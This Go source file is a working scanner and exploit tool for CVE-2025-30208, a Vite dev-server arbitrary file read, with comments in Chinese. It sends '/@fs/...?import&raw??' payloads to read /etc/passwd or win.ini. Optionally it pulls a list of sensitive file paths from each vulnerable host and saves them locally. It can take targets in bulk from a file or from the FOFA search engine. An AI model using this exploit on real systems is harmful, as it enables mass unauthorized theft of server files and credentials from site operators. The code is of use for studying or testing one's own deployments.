package main

import (
	"bufio"
	"encoding/csv"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

var (
	NeedFofa bool
	Url      string
	FileName string
	Exploit  bool
)

func init() {
	flag.BoolVar(&NeedFofa, "fofa", false, "确认是否需要fofa")
	flag.StringVar(&Url, "url", "", "检测存在漏洞的url")
	flag.StringVar(&Url, "u", "", "检测存在漏洞的url")
	flag.StringVar(&FileName, "filename", "", "批量检测文件")
	flag.StringVar(&FileName, "f", "", "批量检测文件")
	flag.BoolVar(&Exploit, "e", false, "是否深度利用漏洞(谨慎使用)")
	flag.Parse()
}

func (target *Target) check_CVE_2025_30208() (platform string, isVul bool) {
	INFO("[*] 检测目标：%s是否存在CVE_2025_30208\n", target.Url)
	resp, err := Request(target.Url)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	content, err := io.ReadAll(resp.Body)
	re := regexp.MustCompile(`<script type="module" src="(.*?)/@vite/client"`)
	matches := re.FindStringSubmatch(string(content))
	if len(matches) >= 2 {
		rootPath := matches[1]
		target.RootPath = rootPath
	}
	nixPayload := "/@fs/etc/passwd?import&raw??"
	resp1, err := Request(target.Url + target.RootPath + nixPayload)
	if err == nil {
		defer resp1.Body.Close()
		content, err := io.ReadAll(resp1.Body)
		if err == nil {
			if strings.Contains(string(content), "export default") {
				target.Platform = "linux"
				return "linux", true
			}
		}
	}
	winPayload := "/@fs/C://windows/win.ini?import&raw??"
	resp2, err := Request(target.Url + target.RootPath + winPayload)
	if err != nil {
		return "", false
	}
	defer resp2.Body.Close()
	content2, err := io.ReadAll(resp2.Body)
	if strings.Contains(string(content2), "export default") {
		target.Platform = "windows"
		return "windows", true
	}
	return "", false
}

func writeContentToFile(content string, filePath string) (bool, error) {
	parts := strings.Split(content, "//#")
	// 检查分割后的结果，取第一部分
	if len(parts) == 0 {
		return false, errors.New("解析内容失败!")
	}
	beforeComment := parts[0]
	re := regexp.MustCompile(`export default\s*"(.*)"`)
	matches := re.FindStringSubmatch(beforeComment)
	if len(matches) < 2 {
		return false, errors.New("正则解析内容失败!")
	}
	sensitiveContent := matches[1]
	sensitiveContent = strings.Replace(sensitiveContent, "\\r\\n", "\r\n", -1)
	sensitiveContent = strings.Replace(sensitiveContent, "\\n", "\n", -1)
	sensitiveContent = strings.Replace(sensitiveContent, "\\t", "\t", -1)
	dir := filepath.Dir(filePath)
	err := os.MkdirAll(dir, 0777)
	if err != nil {
		return false, errors.New(fmt.Sprintf("创建目录\"%s\"失败!", dir))
	}
	file, err := os.Create(filePath)
	if err != nil {
		return false, errors.New(fmt.Sprintf("创建\"%s\"文件失败！", filePath))
	}
	defer file.Close()
	writer := bufio.NewWriter(file)
	defer writer.Flush()
	_, err = writer.WriteString(sensitiveContent)
	if err != nil {
		return false, errors.New(fmt.Sprintf("往\"%s\"中写入内容失败！", filePath))
	}
	return true, nil
}

// 根据相应的平台进行深度利用，比如读取敏感文件并保存到本地
func (target Target) exploit_CVE_2025_30208() (bool, error) {
	sensitivePathFile := target.Platform + "_sensitive_path.txt"
	file, err := os.Open(sensitivePathFile)
	if err != nil {
		return false, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		sensitivePath := scanner.Text()
		sensitivePath = strings.Replace(sensitivePath, "\\", "/", -1)
		testValUrl := target.Url + target.RootPath + "/@fs" + sensitivePath + "?import&raw??"
		fmt.Println(testValUrl)
		response, err := Request(testValUrl)
		if err != nil {
			continue
		}
		defer response.Body.Close()
		resp, err := io.ReadAll(response.Body)
		content := string(resp)
		if !strings.Contains(content, "export default") {
			continue
		}
		fileName := path.Join(target.HOST, sensitivePath)
		ok, err := writeContentToFile(content, fileName)
		if !ok {
			ERROR("[-] 解析%s网站内容时出现错误：%s 请手动检测该端点！\n", testValUrl, err.Error())
			continue
		}
		SUCCESS("[+] 对%s的漏洞利用成功！敏感文件已经写入到%s中", testValUrl, fileName)
	}
	info, err := os.Stat(target.HOST)
	if err != nil {
		if os.IsNotExist(err) {
			return false, errors.New("利用失败!")
		}
		return false, err
	}
	return info.IsDir(), nil
}

// 为url添加http://和https://，并检查url合法性，顺便检测是否存活
func NormalizeUrl(targetUrl string) (Target, bool) {
	targetUrl = strings.Trim(targetUrl, "/")
	Port := ""
	if !strings.HasPrefix(targetUrl, "http://") && !strings.HasPrefix(targetUrl, "https://") {
		httpTargetUrl := "http://" + targetUrl
		u, err := url.Parse(httpTargetUrl)
		if err == nil {
			request, err := Request(httpTargetUrl)
			if err == nil {
				defer request.Body.Close()
				Port = u.Port()
				if Port == "" {
					Port = "80"
				}
				return Target{
					HOST:       u.Host,
					IP:         u.Host,
					Port:       Port,
					Protocal:   u.Scheme,
					Url:        httpTargetUrl,
					StatusCode: request.StatusCode,
				}, true
			}
		}
		httpsTargetUrl := "https://" + targetUrl
		u2, err := url.Parse("https://" + targetUrl)
		if err != nil {
			return Target{}, false
		}
		request2, err := Request(httpsTargetUrl)
		if err != nil {
			return Target{}, false
		}
		defer request2.Body.Close()
		Port = u.Port()
		if Port == "" {
			Port = "443"
		}
		return Target{
			HOST:       u2.Host,
			IP:         u2.Host,
			Port:       Port,
			Protocal:   u2.Scheme,
			Url:        httpsTargetUrl,
			StatusCode: request2.StatusCode,
		}, true
	}
	u, err := url.Parse(targetUrl)
	if err != nil {
		return Target{}, false
	}
	request, err := Request(targetUrl)
	if err != nil {
		return Target{}, false
	}
	defer request.Body.Close()
	if Port == "" {
		if strings.HasPrefix(targetUrl, "http://") {
			Port = "80"
		} else {
			Port = "443"
		}
	}
	return Target{
		HOST:       u.Host,
		IP:         u.Host,
		Port:       Port,
		Protocal:   u.Scheme,
		Url:        targetUrl,
		StatusCode: request.StatusCode,
	}, true
}

func saveResult(successList []Target) {
	fileName2 := fmt.Sprintf("%d", time.Now().Unix()) + ".csv"
	file2, err := os.Create(fileName2)
	if err != nil {
		ERROR("[-] 未能成功将结果输出到文件中！")
		os.Exit(1)
	}
	defer file2.Close()
	writer := csv.NewWriter(file2)
	defer writer.Flush()
	writer.Write([]string{"IP", "PORT", "URL", "Protocal", "Platform"})
	for _, result := range successList {
		writer.Write([]string{result.IP, result.Port, result.Url, result.Protocal, result.Platform})
	}
	SUCCESS("[+] 成功将结果写入到%s文件中", fileName2)
}

func main() {
	if Url == "" && NeedFofa == false && FileName == "" {
		ERROR("请至少输入-u/-url|-fofa|-filename/-f等参数\n")
		flag.Usage()
		os.Exit(1)
	}
	if !NeedFofa {
		// 不用fofa的话，就是检测给定的一个url或者是批量检测给定文件名中的url
		if Url != "" {
			target, ok := NormalizeUrl(Url)
			if !ok {
				ERROR("[-] 请检查输入的url：%s是否正确！\n", Url)
				os.Exit(1)
			}
			platform, vul := target.check_CVE_2025_30208()
			if vul {
				SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, target.Url)
				if Exploit {
					ok, err := target.exploit_CVE_2025_30208()
					if !ok {
						ERROR("[-]失败！%s\n", err)
						os.Exit(1)
					}
					SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下", target.HOST)
				}
			} else {
				ERROR("[-] %s 貌似不存在CVE_2025_30208漏洞！\n", target.Url)
			}
		}
		if FileName != "" {
			file, err := os.Open(FileName)
			if err != nil {
				ERROR("[-] 打开文件 %s 失败：%s。\n", FileName, err.Error())
				os.Exit(1)
			}
			defer file.Close()
			successList := []Target{}
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				Url := scanner.Text()
				if Url == "" {
					continue // 处理空行
				}
				target, ok := NormalizeUrl(Url)
				if !ok {
					ERROR("[-] 请检查url：%s是否正确！\n", Url)
					continue
				}
				platform, vul := target.check_CVE_2025_30208()
				if vul {
					SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, target.Url)
					if Exploit {
						ok, err := target.exploit_CVE_2025_30208()
						if !ok {
							ERROR("[-]失败！%s\n", err)
							os.Exit(1)
						}
						SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下\n", target.HOST)
					}
					successList = append(successList, target)
				} else {
					ERROR("[-] %s貌似不存在CVE_2025_30208漏洞？\n", target.Url)
				}
			}
			if len(successList) != 0 {
				saveResult(successList)
			}
		}
	} else {
		// 联动fofa进行检测， 先从fofa中取出相应的目标资产，然后检测存活度、去重，最终利用相应的cve进行批量检测
		var assets []Target
		assets, err := GetFofaAssets()
		if err != nil {
			ERROR("[-] 出现了错误: %s\n", err.Error())
			os.Exit(1)
		}
		var successList []Target
		for _, asset := range assets {
			platform, vul := asset.check_CVE_2025_30208()
			if vul {
				SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, asset.Url)
				if Exploit {
					ok, err := asset.exploit_CVE_2025_30208()
					if !ok {
						ERROR("[-]失败！%s\n", err)
						os.Exit(1)
					}
					SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下\n", asset.HOST)
				}
				successList = append(successList, asset)
			} else {
				ERROR("[-] %s貌似不存在CVE_2025_30208漏洞？\n", asset.Url)
			}
		}
		if len(successList) != 0 {
			saveResult(successList)
		}
	}
}
